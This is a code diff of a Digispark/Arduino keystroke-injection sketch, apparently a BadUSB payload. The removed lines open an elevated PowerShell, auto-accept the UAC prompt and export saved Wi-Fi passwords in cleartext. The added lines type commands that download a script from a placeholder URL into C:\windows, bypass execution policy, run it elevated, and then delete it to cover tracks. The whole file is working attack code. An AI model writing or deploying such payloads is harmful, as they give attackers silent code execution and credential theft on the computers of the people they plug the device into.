@@ -1,17 +1,11 @@
-/*
-* Author: Ecthor Silva
-* Description: 
-*/
-
 #include "DigiKeyboardPtBr.h"
 
-void setup(){
-  //empity
+void setup() {
+  //empty
 }
-
-void loop(){
+void loop() {
   DigiKeyboardPtBr.sendKeyStroke(0);
-  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboardPtBr.delay(1000);
   DigiKeyboardPtBr.print("powershell");
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
@@ -21,16 +15,25 @@ void loop(){
   DigiKeyboardPtBr.delay(1000);
   DigiKeyboardPtBr.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // Alt + Y
   DigiKeyboardPtBr.delay(1000);
-  DigiKeyboardPtBr.print("Start-Service -Name 'wlansvc'");
+  DigiKeyboardPtBr.print("$url = 'URL HERE';");
+  DigiKeyboardPtBr.print("$output='C:\\windows\\script.ps1';");
+  DigiKeyboardPtBr.print("Invoke-WebRequest -Uri $url -OutFile $output;");
+  DigiKeyboardPtBr.print("Set-ExecutionPolicy Unrestricted -Scope Process -Force;");
+  DigiKeyboardPtBr.print("Start-Process -FilePath 'powershell.exe' -ArgumentList \"-ExecutionPolicy Bypass -File $output\"; exit");
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
   DigiKeyboardPtBr.delay(1000);
-  DigiKeyboardPtBr.print("$folderDateTime = (get-date).ToString('d-M-y HHmmss');");
-  DigiKeyboardPtBr.print("$userDir = (Get-ChildItem env:\\userprofile).value + '\\Ghost Report ' + $folderDateTime;");
-  DigiKeyboardPtBr.print("$fileSaveDir = New-Item ($userDir) -ItemType Directory;");
-  DigiKeyboardPtBr.print("$date = get-date;");
-  DigiKeyboardPtBr.print("netsh wlan export profile key=clear folder=$fileSaveDir; exit");
-  // DigiKeyboardPtBr.print("Compress-Archive -Path $fileSaveDir -DestinationPath '$env:USERPROFILE\ResultsPassword.zip';");
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.print("powershell");
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
-
-  for (;;){/*empty*/}
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.print("powershell Start-Process powershell -Verb runAs; exit");
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // Alt + Y
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.print("$output='C:\\windows\\script.ps1';");
+  DigiKeyboardPtBr.print("Remove-Item $output; exit");
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  for (;;) { /*empty*/ }
 }
